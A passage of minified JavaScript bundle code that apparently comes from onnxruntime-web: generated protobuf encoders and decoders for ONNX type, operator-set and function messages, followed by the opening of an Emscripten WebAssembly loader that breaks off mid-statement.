1:message.tensorType=$root.onnx.TypeProto.Tensor.decode(reader,reader.uint32());break;case 4:message.sequenceType=$root.onnx.TypeProto.Sequence.decode(reader,reader.uint32());break;case 5:message.mapType=$root.onnx.TypeProto.Map.decode(reader,reader.uint32());break;case 9:message.optionalType=$root.onnx.TypeProto.Optional.decode(reader,reader.uint32());break;case 8:message.sparseTensorType=$root.onnx.TypeProto.SparseTensor.decode(reader,reader.uint32());break;case 6:message.denotation=reader.string();break;default:reader.skipType(7&tag)}}return message},TypeProto.decodeDelimited=function decodeDelimited(reader){return reader instanceof $Reader||(reader=new $Reader(reader)),this.decode(reader,reader.uint32())},TypeProto.verify=function verify(message){if("object"!=typeof message||null===message)return"object expected";var properties={};if(null!=message.tensorType&&message.hasOwnProperty("tensorType")&&(properties.value=1,error=$root.onnx.TypeProto.Tensor.verify(message.tensorType)))return"tensorType."+error;if(null!=message.sequenceType&&message.hasOwnProperty("sequenceType")){if(1===properties.value)return"value: multiple values";if(properties.value=1,error=$root.onnx.TypeProto.Sequence.verify(message.sequenceType))return"sequenceType."+error}if(null!=message.mapType&&message.hasOwnProperty("mapType")){if(1===properties.value)return"value: multiple values";if(properties.value=1,error=$root.onnx.TypeProto.Map.verify(message.mapType))return"mapType."+error}if(null!=message.optionalType&&message.hasOwnProperty("optionalType")){if(1===properties.value)return"value: multiple values";if(properties.value=1,error=$root.onnx.TypeProto.Optional.verify(message.optionalType))return"optionalType."+error}if(null!=message.sparseTensorType&&message.hasOwnProperty("sparseTensorType")){if(1===properties.value)return"value: multiple values";var error;if(properties.value=1,error=$root.onnx.TypeProto.SparseTensor.verify(message.sparseTensorType))return"sparseTensorType."+error}return null!=message.denotation&&message.hasOwnProperty("denotation")&&!$util.isString(message.denotation)?"denotation: string expected":null},TypeProto.fromObject=function fromObject(object){if(object instanceof $root.onnx.TypeProto)return object;var message=new $root.onnx.TypeProto;if(null!=object.tensorType){if("object"!=typeof object.tensorType)throw TypeError(".onnx.TypeProto.tensorType: object expected");message.tensorType=$root.onnx.TypeProto.Tensor.fromObject(object.tensorType)}if(null!=object.sequenceType){if("object"!=typeof object.sequenceType)throw TypeError(".onnx.TypeProto.sequenceType: object expected");message.sequenceType=$root.onnx.TypeProto.Sequence.fromObject(object.sequenceType)}if(null!=object.mapType){if("object"!=typeof object.mapType)throw TypeError(".onnx.TypeProto.mapType: object expected");message.mapType=$root.onnx.TypeProto.Map.fromObject(object.mapType)}if(null!=object.optionalType){if("object"!=typeof object.optionalType)throw TypeError(".onnx.TypeProto.optionalType: object expected");message.optionalType=$root.onnx.TypeProto.Optional.fromObject(object.optionalType)}if(null!=object.sparseTensorType){if("object"!=typeof object.sparseTensorType)throw TypeError(".onnx.TypeProto.sparseTensorType: object expected");message.sparseTensorType=$root.onnx.TypeProto.SparseTensor.fromObject(object.sparseTensorType)}return null!=object.denotation&&(message.denotation=String(object.denotation)),message},TypeProto.toObject=function toObject(message,options){options||(options={});var object={};return options.defaults&&(object.denotation=""),null!=message.tensorType&&message.hasOwnProperty("tensorType")&&(object.tensorType=$root.onnx.TypeProto.Tensor.toObject(message.tensorType,options),options.oneofs&&(object.value="tensorType")),null!=message.sequenceType&&message.hasOwnProperty("sequenceType")&&(object.sequenceType=$root.onnx.TypeProto.Sequence.toObject(message.sequenceType,options),options.oneofs&&(object.value="sequenceType")),null!=message.mapType&&message.hasOwnProperty("mapType")&&(object.mapType=$root.onnx.TypeProto.Map.toObject(message.mapType,options),options.oneofs&&(object.value="mapType")),null!=message.denotation&&message.hasOwnProperty("denotation")&&(object.denotation=message.denotation),null!=message.sparseTensorType&&message.hasOwnProperty("sparseTensorType")&&(object.sparseTensorType=$root.onnx.TypeProto.SparseTensor.toObject(message.sparseTensorType,options),options.oneofs&&(object.value="sparseTensorType")),null!=message.optionalType&&message.hasOwnProperty("optionalType")&&(object.optionalType=$root.onnx.TypeProto.Optional.toObject(message.optionalType,options),options.oneofs&&(object.value="optionalType")),object},TypeProto.prototype.toJSON=function toJSON(){return this.constructor.toObject(this,$protobuf.util.toJSONOptions)},TypeProto.getTypeUrl=function getTypeUrl(typeUrlPrefix){return void 0===typeUrlPrefix&&(typeUrlPrefix="type.googleapis.com"),typeUrlPrefix+"/onnx.TypeProto"},TypeProto.Tensor=function(){function Tensor(properties){if(properties)for(var keys=Object.keys(properties),i=0;i<keys.length;++i)null!=properties[keys[i]]&&(this[keys[i]]=properties[keys[i]])}return Tensor.prototype.elemType=0,Tensor.prototype.shape=null,Tensor.create=function create(properties){return new Tensor(properties)},Tensor.encode=function encode(message,writer){return writer||(writer=$Writer.create()),null!=message.elemType&&Object.hasOwnProperty.call(message,"elemType")&&writer.uint32(8).int32(message.elemType),null!=message.shape&&Object.hasOwnProperty.call(message,"shape")&&$root.onnx.TensorShapeProto.encode(message.shape,writer.uint32(18).fork()).ldelim(),writer},Tensor.encodeDelimited=function encodeDelimited(message,writer){return this.encode(message,writer).ldelim()},Tensor.decode=function decode(reader,length){reader instanceof $Reader||(reader=$Reader.create(reader));for(var end=void 0===length?reader.len:reader.pos+length,message=new $root.onnx.TypeProto.Tensor;reader.pos<end;){var tag=reader.uint32();switch(tag>>>3){case 1:message.elemType=reader.int32();break;case 2:message.shape=$root.onnx.TensorShapeProto.decode(reader,reader.uint32());break;default:reader.skipType(7&tag)}}return message},Tensor.decodeDelimited=function decodeDelimited(reader){return reader instanceof $Reader||(reader=new $Reader(reader)),this.decode(reader,reader.uint32())},Tensor.verify=function verify(message){if("object"!=typeof message||null===message)return"object expected";if(null!=message.elemType&&message.hasOwnProperty("elemType")&&!$util.isInteger(message.elemType))return"elemType: integer expected";if(null!=message.shape&&message.hasOwnProperty("shape")){var error=$root.onnx.TensorShapeProto.verify(message.shape);if(error)return"shape."+error}return null},Tensor.fromObject=function fromObject(object){if(object instanceof $root.onnx.TypeProto.Tensor)return object;var message=new $root.onnx.TypeProto.Tensor;if(null!=object.elemType&&(message.elemType=0|object.elemType),null!=object.shape){if("object"!=typeof object.shape)throw TypeError(".onnx.TypeProto.Tensor.shape: object expected");message.shape=$root.onnx.TensorShapeProto.fromObject(object.shape)}return message},Tensor.toObject=function toObject(message,options){options||(options={});var object={};return options.defaults&&(object.elemType=0,object.shape=null),null!=message.elemType&&message.hasOwnProperty("elemType")&&(object.elemType=message.elemType),null!=message.shape&&message.hasOwnProperty("shape")&&(object.shape=$root.onnx.TensorShapeProto.toObject(message.shape,options)),object},Tensor.prototype.toJSON=function toJSON(){return this.constructor.toObject(this,$protobuf.util.toJSONOptions)},Tensor.getTypeUrl=function getTypeUrl(typeUrlPrefix){return void 0===typeUrlPrefix&&(typeUrlPrefix="type.googleapis.com"),typeUrlPrefix+"/onnx.TypeProto.Tensor"},Tensor}(),TypeProto.Sequence=function(){function Sequence(properties){if(properties)for(var keys=Object.keys(properties),i=0;i<keys.length;++i)null!=properties[keys[i]]&&(this[keys[i]]=properties[keys[i]])}return Sequence.prototype.elemType=null,Sequence.create=function create(properties){return new Sequence(properties)},Sequence.encode=function encode(message,writer){return writer||(writer=$Writer.create()),null!=message.elemType&&Object.hasOwnProperty.call(message,"elemType")&&$root.onnx.TypeProto.encode(message.elemType,writer.uint32(10).fork()).ldelim(),writer},Sequence.encodeDelimited=function encodeDelimited(message,writer){return this.encode(message,writer).ldelim()},Sequence.decode=function decode(reader,length){reader instanceof $Reader||(reader=$Reader.create(reader));for(var end=void 0===length?reader.len:reader.pos+length,message=new $root.onnx.TypeProto.Sequence;reader.pos<end;){var tag=reader.uint32();tag>>>3==1?message.elemType=$root.onnx.TypeProto.decode(reader,reader.uint32()):reader.skipType(7&tag)}return message},Sequence.decodeDelimited=function decodeDelimited(reader){return reader instanceof $Reader||(reader=new $Reader(reader)),this.decode(reader,reader.uint32())},Sequence.verify=function verify(message){if("object"!=typeof message||null===message)return"object expected";if(null!=message.elemType&&message.hasOwnProperty("elemType")){var error=$root.onnx.TypeProto.verify(message.elemType);if(error)return"elemType."+error}return null},Sequence.fromObject=function fromObject(object){if(object instanceof $root.onnx.TypeProto.Sequence)return object;var message=new $root.onnx.TypeProto.Sequence;if(null!=object.elemType){if("object"!=typeof object.elemType)throw TypeError(".onnx.TypeProto.Sequence.elemType: object expected");message.elemType=$root.onnx.TypeProto.fromObject(object.elemType)}return message},Sequence.toObject=function toObject(message,options){options||(options={});var object={};return options.defaults&&(object.elemType=null),null!=message.elemType&&message.hasOwnProperty("elemType")&&(object.elemType=$root.onnx.TypeProto.toObject(message.elemType,options)),object},Sequence.prototype.toJSON=function toJSON(){return this.constructor.toObject(this,$protobuf.util.toJSONOptions)},Sequence.getTypeUrl=function getTypeUrl(typeUrlPrefix){return void 0===typeUrlPrefix&&(typeUrlPrefix="type.googleapis.com"),typeUrlPrefix+"/onnx.TypeProto.Sequence"},Sequence}(),TypeProto.Map=function(){function Map(properties){if(properties)for(var keys=Object.keys(properties),i=0;i<keys.length;++i)null!=properties[keys[i]]&&(this[keys[i]]=properties[keys[i]])}return Map.prototype.keyType=0,Map.prototype.valueType=null,Map.create=function create(properties){return new Map(properties)},Map.encode=function encode(message,writer){return writer||(writer=$Writer.create()),null!=message.keyType&&Object.hasOwnProperty.call(message,"keyType")&&writer.uint32(8).int32(message.keyType),null!=message.valueType&&Object.hasOwnProperty.call(message,"valueType")&&$root.onnx.TypeProto.encode(message.valueType,writer.uint32(18).fork()).ldelim(),writer},Map.encodeDelimited=function encodeDelimited(message,writer){return this.encode(message,writer).ldelim()},Map.decode=function decode(reader,length){reader instanceof $Reader||(reader=$Reader.create(reader));for(var end=void 0===length?reader.len:reader.pos+length,message=new $root.onnx.TypeProto.Map;reader.pos<end;){var tag=reader.uint32();switch(tag>>>3){case 1:message.keyType=reader.int32();break;case 2:message.valueType=$root.onnx.TypeProto.decode(reader,reader.uint32());break;default:reader.skipType(7&tag)}}return message},Map.decodeDelimited=function decodeDelimited(reader){return reader instanceof $Reader||(reader=new $Reader(reader)),this.decode(reader,reader.uint32())},Map.verify=function verify(message){if("object"!=typeof message||null===message)return"object expected";if(null!=message.keyType&&message.hasOwnProperty("keyType")&&!$util.isInteger(message.keyType))return"keyType: integer expected";if(null!=message.valueType&&message.hasOwnProperty("valueType")){var error=$root.onnx.TypeProto.verify(message.valueType);if(error)return"valueType."+error}return null},Map.fromObject=function fromObject(object){if(object instanceof $root.onnx.TypeProto.Map)return object;var message=new $root.onnx.TypeProto.Map;if(null!=object.keyType&&(message.keyType=0|object.keyType),null!=object.valueType){if("object"!=typeof object.valueType)throw TypeError(".onnx.TypeProto.Map.valueType: object expected");message.valueType=$root.onnx.TypeProto.fromObject(object.valueType)}return message},Map.toObject=function toObject(message,options){options||(options={});var object={};return options.defaults&&(object.keyType=0,object.valueType=null),null!=message.keyType&&message.hasOwnProperty("keyType")&&(object.keyType=message.keyType),null!=message.valueType&&message.hasOwnProperty("valueType")&&(object.valueType=$root.onnx.TypeProto.toObject(message.valueType,options)),object},Map.prototype.toJSON=function toJSON(){return this.constructor.toObject(this,$protobuf.util.toJSONOptions)},Map.getTypeUrl=function getTypeUrl(typeUrlPrefix){return void 0===typeUrlPrefix&&(typeUrlPrefix="type.googleapis.com"),typeUrlPrefix+"/onnx.TypeProto.Map"},Map}(),TypeProto.Optional=function(){function Optional(properties){if(properties)for(var keys=Object.keys(properties),i=0;i<keys.length;++i)null!=properties[keys[i]]&&(this[keys[i]]=properties[keys[i]])}return Optional.prototype.elemType=null,Optional.create=function create(properties){return new Optional(properties)},Optional.encode=function encode(message,writer){return writer||(writer=$Writer.create()),null!=message.elemType&&Object.hasOwnProperty.call(message,"elemType")&&$root.onnx.TypeProto.encode(message.elemType,writer.uint32(10).fork()).ldelim(),writer},Optional.encodeDelimited=function encodeDelimited(message,writer){return this.encode(message,writer).ldelim()},Optional.decode=function decode(reader,length){reader instanceof $Reader||(reader=$Reader.create(reader));for(var end=void 0===length?reader.len:reader.pos+length,message=new $root.onnx.TypeProto.Optional;reader.pos<end;){var tag=reader.uint32();tag>>>3==1?message.elemType=$root.onnx.TypeProto.decode(reader,reader.uint32()):reader.skipType(7&tag)}return message},Optional.decodeDelimited=function decodeDelimited(reader){return reader instanceof $Reader||(reader=new $Reader(reader)),this.decode(reader,reader.uint32())},Optional.verify=function verify(message){if("object"!=typeof message||null===message)return"object expected";if(null!=message.elemType&&message.hasOwnProperty("elemType")){var error=$root.onnx.TypeProto.verify(message.elemType);if(error)return"elemType."+error}return null},Optional.fromObject=function fromObject(object){if(object instanceof $root.onnx.TypeProto.Optional)return object;var message=new $root.onnx.TypeProto.Optional;if(null!=object.elemType){if("object"!=typeof object.elemType)throw TypeError(".onnx.TypeProto.Optional.elemType: object expected");message.elemType=$root.onnx.TypeProto.fromObject(object.elemType)}return message},Optional.toObject=function toObject(message,options){options||(options={});var object={};return options.defaults&&(object.elemType=null),null!=message.elemType&&message.hasOwnProperty("elemType")&&(object.elemType=$root.onnx.TypeProto.toObject(message.elemType,options)),object},Optional.prototype.toJSON=function toJSON(){return this.constructor.toObject(this,$protobuf.util.toJSONOptions)},Optional.getTypeUrl=function getTypeUrl(typeUrlPrefix){return void 0===typeUrlPrefix&&(typeUrlPrefix="type.googleapis.com"),typeUrlPrefix+"/onnx.TypeProto.Optional"},Optional}(),TypeProto.SparseTensor=function(){function SparseTensor(properties){if(properties)for(var keys=Object.keys(properties),i=0;i<keys.length;++i)null!=properties[keys[i]]&&(this[keys[i]]=properties[keys[i]])}return SparseTensor.prototype.elemType=0,SparseTensor.prototype.shape=null,SparseTensor.create=function create(properties){return new SparseTensor(properties)},SparseTensor.encode=function encode(message,writer){return writer||(writer=$Writer.create()),null!=message.elemType&&Object.hasOwnProperty.call(message,"elemType")&&writer.uint32(8).int32(message.elemType),null!=message.shape&&Object.hasOwnProperty.call(message,"shape")&&$root.onnx.TensorShapeProto.encode(message.shape,writer.uint32(18).fork()).ldelim(),writer},SparseTensor.encodeDelimited=function encodeDelimited(message,writer){return this.encode(message,writer).ldelim()},SparseTensor.decode=function decode(reader,length){reader instanceof $Reader||(reader=$Reader.create(reader));for(var end=void 0===length?reader.len:reader.pos+length,message=new $root.onnx.TypeProto.SparseTensor;reader.pos<end;){var tag=reader.uint32();switch(tag>>>3){case 1:message.elemType=reader.int32();break;case 2:message.shape=$root.onnx.TensorShapeProto.decode(reader,reader.uint32());break;default:reader.skipType(7&tag)}}return message},SparseTensor.decodeDelimited=function decodeDelimited(reader){return reader instanceof $Reader||(reader=new $Reader(reader)),this.decode(reader,reader.uint32())},SparseTensor.verify=function verify(message){if("object"!=typeof message||null===message)return"object expected";if(null!=message.elemType&&message.hasOwnProperty("elemType")&&!$util.isInteger(message.elemType))return"elemType: integer expected";if(null!=message.shape&&message.hasOwnProperty("shape")){var error=$root.onnx.TensorShapeProto.verify(message.shape);if(error)return"shape."+error}return null},SparseTensor.fromObject=function fromObject(object){if(object instanceof $root.onnx.TypeProto.SparseTensor)return object;var message=new $root.onnx.TypeProto.SparseTensor;if(null!=object.elemType&&(message.elemType=0|object.elemType),null!=object.shape){if("object"!=typeof object.shape)throw TypeError(".onnx.TypeProto.SparseTensor.shape: object expected");message.shape=$root.onnx.TensorShapeProto.fromObject(object.shape)}return message},SparseTensor.toObject=function toObject(message,options){options||(options={});var object={};return options.defaults&&(object.elemType=0,object.shape=null),null!=message.elemType&&message.hasOwnProperty("elemType")&&(object.elemType=message.elemType),null!=message.shape&&message.hasOwnProperty("shape")&&(object.shape=$root.onnx.TensorShapeProto.toObject(message.shape,options)),object},SparseTensor.prototype.toJSON=function toJSON(){return this.constructor.toObject(this,$protobuf.util.toJSONOptions)},SparseTensor.getTypeUrl=function getTypeUrl(typeUrlPrefix){return void 0===typeUrlPrefix&&(typeUrlPrefix="type.googleapis.com"),typeUrlPrefix+"/onnx.TypeProto.SparseTensor"},SparseTensor}(),TypeProto}(),onnx.OperatorSetIdProto=function(){function OperatorSetIdProto(properties){if(properties)for(var keys=Object.keys(properties),i=0;i<keys.length;++i)null!=properties[keys[i]]&&(this[keys[i]]=properties[keys[i]])}return OperatorSetIdProto.prototype.domain="",OperatorSetIdProto.prototype.version=$util.Long?$util.Long.fromBits(0,0,!1):0,OperatorSetIdProto.create=function create(properties){return new OperatorSetIdProto(properties)},OperatorSetIdProto.encode=function encode(message,writer){return writer||(writer=$Writer.create()),null!=message.domain&&Object.hasOwnProperty.call(message,"domain")&&writer.uint32(10).string(message.domain),null!=message.version&&Object.hasOwnProperty.call(message,"version")&&writer.uint32(16).int64(message.version),writer},OperatorSetIdProto.encodeDelimited=function encodeDelimited(message,writer){return this.encode(message,writer).ldelim()},OperatorSetIdProto.decode=function decode(reader,length){reader instanceof $Reader||(reader=$Reader.create(reader));for(var end=void 0===length?reader.len:reader.pos+length,message=new $root.onnx.OperatorSetIdProto;reader.pos<end;){var tag=reader.uint32();switch(tag>>>3){case 1:message.domain=reader.string();break;case 2:message.version=reader.int64();break;default:reader.skipType(7&tag)}}return message},OperatorSetIdProto.decodeDelimited=function decodeDelimited(reader){return reader instanceof $Reader||(reader=new $Reader(reader)),this.decode(reader,reader.uint32())},OperatorSetIdProto.verify=function verify(message){return"object"!=typeof message||null===message?"object expected":null!=message.domain&&message.hasOwnProperty("domain")&&!$util.isString(message.domain)?"domain: string expected":null!=message.version&&message.hasOwnProperty("version")&&!($util.isInteger(message.version)||message.version&&$util.isInteger(message.version.low)&&$util.isInteger(message.version.high))?"version: integer|Long expected":null},OperatorSetIdProto.fromObject=function fromObject(object){if(object instanceof $root.onnx.OperatorSetIdProto)return object;var message=new $root.onnx.OperatorSetIdProto;return null!=object.domain&&(message.domain=String(object.domain)),null!=object.version&&($util.Long?(message.version=$util.Long.fromValue(object.version)).unsigned=!1:"string"==typeof object.version?message.version=parseInt(object.version,10):"number"==typeof object.version?message.version=object.version:"object"==typeof object.version&&(message.version=new $util.LongBits(object.version.low>>>0,object.version.high>>>0).toNumber())),message},OperatorSetIdProto.toObject=function toObject(message,options){options||(options={});var object={};if(options.defaults)if(object.domain="",$util.Long){var long=new $util.Long(0,0,!1);object.version=options.longs===String?long.toString():options.longs===Number?long.toNumber():long}else object.version=options.longs===String?"0":0;return null!=message.domain&&message.hasOwnProperty("domain")&&(object.domain=message.domain),null!=message.version&&message.hasOwnProperty("version")&&("number"==typeof message.version?object.version=options.longs===String?String(message.version):message.version:object.version=options.longs===String?$util.Long.prototype.toString.call(message.version):options.longs===Number?new $util.LongBits(message.version.low>>>0,message.version.high>>>0).toNumber():message.version),object},OperatorSetIdProto.prototype.toJSON=function toJSON(){return this.constructor.toObject(this,$protobuf.util.toJSONOptions)},OperatorSetIdProto.getTypeUrl=function getTypeUrl(typeUrlPrefix){return void 0===typeUrlPrefix&&(typeUrlPrefix="type.googleapis.com"),typeUrlPrefix+"/onnx.OperatorSetIdProto"},OperatorSetIdProto}(),onnx.OperatorStatus=function(){var valuesById={},values=Object.create(valuesById);return values[valuesById[0]="EXPERIMENTAL"]=0,values[valuesById[1]="STABLE"]=1,values}(),onnx.FunctionProto=function(){function FunctionProto(properties){if(this.input=[],this.output=[],this.attribute=[],this.attributeProto=[],this.node=[],this.opsetImport=[],properties)for(var keys=Object.keys(properties),i=0;i<keys.length;++i)null!=properties[keys[i]]&&(this[keys[i]]=properties[keys[i]])}return FunctionProto.prototype.name="",FunctionProto.prototype.input=$util.emptyArray,FunctionProto.prototype.output=$util.emptyArray,FunctionProto.prototype.attribute=$util.emptyArray,FunctionProto.prototype.attributeProto=$util.emptyArray,FunctionProto.prototype.node=$util.emptyArray,FunctionProto.prototype.docString="",FunctionProto.prototype.opsetImport=$util.emptyArray,FunctionProto.prototype.domain="",FunctionProto.create=function create(properties){return new FunctionProto(properties)},FunctionProto.encode=function encode(message,writer){if(writer||(writer=$Writer.create()),null!=message.name&&Object.hasOwnProperty.call(message,"name")&&writer.uint32(10).string(message.name),null!=message.input&&message.input.length)for(var i=0;i<message.input.length;++i)writer.uint32(34).string(message.input[i]);if(null!=message.output&&message.output.length)for(i=0;i<message.output.length;++i)writer.uint32(42).string(message.output[i]);if(null!=message.attribute&&message.attribute.length)for(i=0;i<message.attribute.length;++i)writer.uint32(50).string(message.attribute[i]);if(null!=message.node&&message.node.length)for(i=0;i<message.node.length;++i)$root.onnx.NodeProto.encode(message.node[i],writer.uint32(58).fork()).ldelim();if(null!=message.docString&&Object.hasOwnProperty.call(message,"docString")&&writer.uint32(66).string(message.docString),null!=message.opsetImport&&message.opsetImport.length)for(i=0;i<message.opsetImport.length;++i)$root.onnx.OperatorSetIdProto.encode(message.opsetImport[i],writer.uint32(74).fork()).ldelim();if(null!=message.domain&&Object.hasOwnProperty.call(message,"domain")&&writer.uint32(82).string(message.domain),null!=message.attributeProto&&message.attributeProto.length)for(i=0;i<message.attributeProto.length;++i)$root.onnx.AttributeProto.encode(message.attributeProto[i],writer.uint32(90).fork()).ldelim();return writer},FunctionProto.encodeDelimited=function encodeDelimited(message,writer){return this.encode(message,writer).ldelim()},FunctionProto.decode=function decode(reader,length){reader instanceof $Reader||(reader=$Reader.create(reader));for(var end=void 0===length?reader.len:reader.pos+length,message=new $root.onnx.FunctionProto;reader.pos<end;){var tag=reader.uint32();switch(tag>>>3){case 1:message.name=reader.string();break;case 4:message.input&&message.input.length||(message.input=[]),message.input.push(reader.string());break;case 5:message.output&&message.output.length||(message.output=[]),message.output.push(reader.string());break;case 6:message.attribute&&message.attribute.length||(message.attribute=[]),message.attribute.push(reader.string());break;case 11:message.attributeProto&&message.attributeProto.length||(message.attributeProto=[]),message.attributeProto.push($root.onnx.AttributeProto.decode(reader,reader.uint32()));break;case 7:message.node&&message.node.length||(message.node=[]),message.node.push($root.onnx.NodeProto.decode(reader,reader.uint32()));break;case 8:message.docString=reader.string();break;case 9:message.opsetImport&&message.opsetImport.length||(message.opsetImport=[]),message.opsetImport.push($root.onnx.OperatorSetIdProto.decode(reader,reader.uint32()));break;case 10:message.domain=reader.string();break;default:reader.skipType(7&tag)}}return message},FunctionProto.decodeDelimited=function decodeDelimited(reader){return reader instanceof $Reader||(reader=new $Reader(reader)),this.decode(reader,reader.uint32())},FunctionProto.verify=function verify(message){if("object"!=typeof message||null===message)return"object expected";if(null!=message.name&&message.hasOwnProperty("name")&&!$util.isString(message.name))return"name: string expected";if(null!=message.input&&message.hasOwnProperty("input")){if(!Array.isArray(message.input))return"input: array expected";for(var i=0;i<message.input.length;++i)if(!$util.isString(message.input[i]))return"input: string[] expected"}if(null!=message.output&&message.hasOwnProperty("output")){if(!Array.isArray(message.output))return"output: array expected";for(i=0;i<message.output.length;++i)if(!$util.isString(message.output[i]))return"output: string[] expected"}if(null!=message.attribute&&message.hasOwnProperty("attribute")){if(!Array.isArray(message.attribute))return"attribute: array expected";for(i=0;i<message.attribute.length;++i)if(!$util.isString(message.attribute[i]))return"attribute: string[] expected"}if(null!=message.attributeProto&&message.hasOwnProperty("attributeProto")){if(!Array.isArray(message.attributeProto))return"attributeProto: array expected";for(i=0;i<message.attributeProto.length;++i)if(error=$root.onnx.AttributeProto.verify(message.attributeProto[i]))return"attributeProto."+error}if(null!=message.node&&message.hasOwnProperty("node")){if(!Array.isArray(message.node))return"node: array expected";for(i=0;i<message.node.length;++i)if(error=$root.onnx.NodeProto.verify(message.node[i]))return"node."+error}if(null!=message.docString&&message.hasOwnProperty("docString")&&!$util.isString(message.docString))return"docString: string expected";if(null!=message.opsetImport&&message.hasOwnProperty("opsetImport")){if(!Array.isArray(message.opsetImport))return"opsetImport: array expected";for(i=0;i<message.opsetImport.length;++i){var error;if(error=$root.onnx.OperatorSetIdProto.verify(message.opsetImport[i]))return"opsetImport."+error}}return null!=message.domain&&message.hasOwnProperty("domain")&&!$util.isString(message.domain)?"domain: string expected":null},FunctionProto.fromObject=function fromObject(object){if(object instanceof $root.onnx.FunctionProto)return object;var message=new $root.onnx.FunctionProto;if(null!=object.name&&(message.name=String(object.name)),object.input){if(!Array.isArray(object.input))throw TypeError(".onnx.FunctionProto.input: array expected");message.input=[];for(var i=0;i<object.input.length;++i)message.input[i]=String(object.input[i])}if(object.output){if(!Array.isArray(object.output))throw TypeError(".onnx.FunctionProto.output: array expected");for(message.output=[],i=0;i<object.output.length;++i)message.output[i]=String(object.output[i])}if(object.attribute){if(!Array.isArray(object.attribute))throw TypeError(".onnx.FunctionProto.attribute: array expected");for(message.attribute=[],i=0;i<object.attribute.length;++i)message.attribute[i]=String(object.attribute[i])}if(object.attributeProto){if(!Array.isArray(object.attributeProto))throw TypeError(".onnx.FunctionProto.attributeProto: array expected");for(message.attributeProto=[],i=0;i<object.attributeProto.length;++i){if("object"!=typeof object.attributeProto[i])throw TypeError(".onnx.FunctionProto.attributeProto: object expected");message.attributeProto[i]=$root.onnx.AttributeProto.fromObject(object.attributeProto[i])}}if(object.node){if(!Array.isArray(object.node))throw TypeError(".onnx.FunctionProto.node: array expected");for(message.node=[],i=0;i<object.node.length;++i){if("object"!=typeof object.node[i])throw TypeError(".onnx.FunctionProto.node: object expected");message.node[i]=$root.onnx.NodeProto.fromObject(object.node[i])}}if(null!=object.docString&&(message.docString=String(object.docString)),object.opsetImport){if(!Array.isArray(object.opsetImport))throw TypeError(".onnx.FunctionProto.opsetImport: array expected");for(message.opsetImport=[],i=0;i<object.opsetImport.length;++i){if("object"!=typeof object.opsetImport[i])throw TypeError(".onnx.FunctionProto.opsetImport: object expected");message.opsetImport[i]=$root.onnx.OperatorSetIdProto.fromObject(object.opsetImport[i])}}return null!=object.domain&&(message.domain=String(object.domain)),message},FunctionProto.toObject=function toObject(message,options){options||(options={});var object={};if((options.arrays||options.defaults)&&(object.input=[],object.output=[],object.attribute=[],object.node=[],object.opsetImport=[],object.attributeProto=[]),options.defaults&&(object.name="",object.docString="",object.domain=""),null!=message.name&&message.hasOwnProperty("name")&&(object.name=message.name),message.input&&message.input.length){object.input=[];for(var j=0;j<message.input.length;++j)object.input[j]=message.input[j]}if(message.output&&message.output.length)for(object.output=[],j=0;j<message.output.length;++j)object.output[j]=message.output[j];if(message.attribute&&message.attribute.length)for(object.attribute=[],j=0;j<message.attribute.length;++j)object.attribute[j]=message.attribute[j];if(message.node&&message.node.length)for(object.node=[],j=0;j<message.node.length;++j)object.node[j]=$root.onnx.NodeProto.toObject(message.node[j],options);if(null!=message.docString&&message.hasOwnProperty("docString")&&(object.docString=message.docString),message.opsetImport&&message.opsetImport.length)for(object.opsetImport=[],j=0;j<message.opsetImport.length;++j)object.opsetImport[j]=$root.onnx.OperatorSetIdProto.toObject(message.opsetImport[j],options);if(null!=message.domain&&message.hasOwnProperty("domain")&&(object.domain=message.domain),message.attributeProto&&message.attributeProto.length)for(object.attributeProto=[],j=0;j<message.attributeProto.length;++j)object.attributeProto[j]=$root.onnx.AttributeProto.toObject(message.attributeProto[j],options);return object},FunctionProto.prototype.toJSON=function toJSON(){return this.constructor.toObject(this,$protobuf.util.toJSONOptions)},FunctionProto.getTypeUrl=function getTypeUrl(typeUrlPrefix){return void 0===typeUrlPrefix&&(typeUrlPrefix="type.googleapis.com"),typeUrlPrefix+"/onnx.FunctionProto"},FunctionProto}(),onnx),module.exports=$root},"./lib/wasm/binding/ort-wasm-threaded.js":(module,__unused_webpack_exports,__webpack_require__)=>{var _scriptDir,ortWasmThreaded=(_scriptDir="undefined"!=typeof document&&document.currentScript?document.currentScript.src:void 0,"undefined"!=typeof __filename&&(_scriptDir=_scriptDir||__filename),function(moduleArg={}){function aa(){return d.buffer!=l.buffer&&m(),l}function n(){return d.buffer!=l.buffer&&m(),ba}function p(){return d.buffer!=l.buffer&&m(),ca}function r(){return d.buffer!=l.buffer&&m(),da}function ea(){return d.buffer!=l.buffer&&m(),fa}var ha,x,w=moduleArg;w.ready=new Promise(((a,b)=>{ha=a,x=b}));var ma,F,H,ia=Object.assign({},w),ja="./this.program",z=(a,b)=>{throw b},ka="object"==typeof window,A="function"==typeof importScripts,B="object"==typeof process&&"object"==typeof process.versions&&"string"==typeof process.versions.node,D=w.ENVIRONMENT_IS_PTHREAD||!1,E="";function la(a){return w.locateFile?w.locateFile(a,E):E+a}if(B){var fs=__webpack_require__("?63c8"),na=__webpack_require__("?75c6");let a;E=A?na.dirname(E)+"/":__dirname+"/",ma=(b,c)=>(b=b.startsWith("file://")?new URL(b):na.normalize(b),fs.readFileSync(b,c?void 0:"utf8")),H=b=>((b=ma(b,!0)).buffer||(b=new Uint8Array(b)),b),F=(b,c,e,h=!0)=>{b=b.startsWith("file://")?new URL(b):na.normalize(b),fs.readFile(b,h?void 0:"utf8",((g,k)=>{g?e(g):c(h?k.buffer:k)}))},!w.thisProgram&&1<process.argv.length&&(ja=process.argv[1].replace(/\\/g,"/")),process.argv.slice(2),z=(b,c)=>{throw process.exitCode=b,c},w.inspect=()=>"[Emscripten Module object]";try{a=__webpack_require__("?c6f7")}catch(b){throw console.error('The "worker_threads" module is not supported in this node.js build - perhaps a newer version is needed?'),b}global.Worker=a.Worker}else(ka||A)&&(A?E=self.location.href:"undefined"!=typeof document&&document.currentScript&&(E=document.currentScript.src),_scriptDir&&(E=_scriptDir),E=0!==E.indexOf("blob:")?E.substr(0,E.replace(/[?#].*/,"").lastIndexOf("/")+1):"",B||(ma=a=>{var b=new XMLHttpRequest;return b.open("GET",a,!1),b.send(null),b.responseText},A&&(H=a=>{var b=new XMLHttpRequest;return b.open("GET",a,!1),b.responseType="arraybuffer",b.send(null),new Uint8Array(b.response)}),F=(a,b,c)=>{var e=new XMLHttpRequest;e.open("GET",a,!0),e.responseType="arraybuffer",e.onload=()=>{200==e.status||0==e.status&&e.response?b(e.response):c()},e.onerror=c,e.send(null)}));B&&"undefined"==typeof performance&&(global.performance=__webpack_require__("?674f").performance);var 